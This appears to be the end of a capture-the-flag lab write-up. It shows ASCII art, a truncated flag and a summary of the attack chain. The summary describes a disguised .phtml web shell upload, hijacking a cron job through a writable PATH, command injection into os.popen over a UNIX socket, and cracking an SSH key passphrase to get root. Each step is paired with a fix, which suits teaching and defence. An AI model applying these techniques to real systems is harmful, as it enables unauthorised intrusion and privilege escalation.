  vnmmnv%vnmmmmmnv%vnmm;' mmmmmnv%vnmmmmmmm;' mmnv%vnmmmnv%vnmmmnv
  vnmmnv%vnmmmmmnv%vn;;    mmmmnv%vnmmmmmm;;    nv%vnmmmmnv%vnmmmnv
 vnmmnv%vnmmmmmmnv%v;;      mmmnv%vnmmmmm;;      v%vnmmmmmnv%vnmmmnv
 vnmmnv%vnmmmmmmnv%vnmmmmmmmmm;;       mmmmmmmmmnv%vnmmmmmmnv%vnmmmnv
 vnmmnv%vnmmmmmmnv%vnmmmmmmmmmm;;     mmmmmmmmmmnv%vnmmmmmmnv%vnmmmnv
 vnmmnv%vnmmmmm nv%vnmmmmmmmmmmnv;, mmmmmmmmmmmmnv%vn;mmmmmnv%vnmmmnv
 vnmmnv%vnmmmmm  nv%vnmmmmmmmmmnv%;nmmmmmmmmmmmnv%vn; mmmmmnv%vnmmmnv
 `vnmmnv%vnmmmm,  v%vnmmmmmmmmmmnv%vnmmmmmmmmmmnv%v;  mmmmnv%vnnmmnv'
  vnmmnv%vnmmmm;,   %vnmmmmmmmmmnv%vnmmmmmmmmmnv%;'   mmmnv%vnmmmmnv
   vnmmnv%vnmmmm;;,   nmmm;'              mmmm;;'    mmmnv%vnmmmmnv'
   `vnmmnv%vnmmmmm;;,.         mmnv%v;,            mmmmnv%vnmmmmnv'
    `vnmmnv%vnmmmmmmnv%vnmmmmmmmmnv%vnmmmmmmnv%vnmmmmmnv%vnmmmmnv'
      `vnmvn%vnmmmmmmnv%vnmmmmmmmnv%vnmmmmmnv%vnmmmmmnv%vnmmmnv'
          `vn%vnmmmmmmn%:%vnmnmmmmnv%vnmmmnv%:%vnmmnv%vnmnv'

 #  #   #   #### #### #   #
 ####  ###  # ## # ##  ###
 #  # # # # #    #      #

        #  #   #   #   #    ##  #     # #### #### #  ##
        ####  ###  #   #   #  #  # # #  #--  #--  # # #
        #  # #   # ### ###  ##    ###   #### #### ##  #


        HMV{tr1...
```

## Attack Chain Summary

Initial access succeeded when I uploaded a web shell disguised with a .phtml extension, which worked because of a code flaw where the backend upload handler checked an incomplete extension blacklist instead of an allowlist; restricting accepted extensions strictly to verified image formats and disabling PHP execution inside the uploads folder prevents this entry. Lateral movement to igor occurred when a cron job executed a planted script named cut, made possible by a misconfiguration that placed a world-writable web directory at the beginning of the crontab PATH while invoking binaries without absolute paths; purging world-writable directories from PATH and specifying full paths for all utility calls inside scripts closes this vector. The jump to frankenstein followed via command injection against a UNIX domain socket, which stemmed from a code flaw in reanimate_service.py passing unvalidated user input directly into os.popen; switching to subprocess.run with argument arrays and shell=False eliminates the injection surface. Finally, the elevation to root relied on an SSH private key protected by a weak passphrase, representing a design weakness in leaving root keys in user space protected only by dictionary-searchable secrets; storing administrative keys strictly within root custody and enforcing multi-factor or high-entropy credentials breaks this final step.
